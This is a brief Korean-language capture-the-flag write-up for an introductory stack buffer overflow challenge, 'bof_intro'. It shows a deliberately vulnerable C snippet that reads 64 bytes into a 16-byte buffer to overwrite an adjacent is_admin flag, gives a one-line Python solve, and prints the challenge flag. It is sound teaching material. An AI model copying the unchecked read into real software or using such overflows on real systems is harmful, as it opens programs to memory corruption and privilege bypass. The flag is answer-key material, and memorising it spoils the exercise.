# [BOF Track] Level 1: 기초 (Intro) - `bof_intro`

## 1. 문제 개요
스택 버퍼 오버플로우의 가장 기초적인 원리인 **로컬 변수 덮어쓰기(Local Variable Corruption)**를 체험하는 문제입니다.

---

## 2. 취약점 분석
```c
volatile int is_admin = 0;
char buffer[16];
read(0, buffer, 64);
```
- `buffer`의 크기는 16바이트이지만, `read()`로 64바이트까지 입력을 받습니다.
- 버퍼에 16바이트 이상의 데이터를 입력하면 스택 메모리 상에서 바로 인접한 `is_admin` 변수의 값이 0이 아닌 값으로 덮어써져 관리자 인증을 통과하게 됩니다.

---

## 3. 공략법
```bash
python3 -c 'print("A"*32)' | ./bof_intro
```

---

## 4. 플래그
`FLAG{bof_intro_practice}`
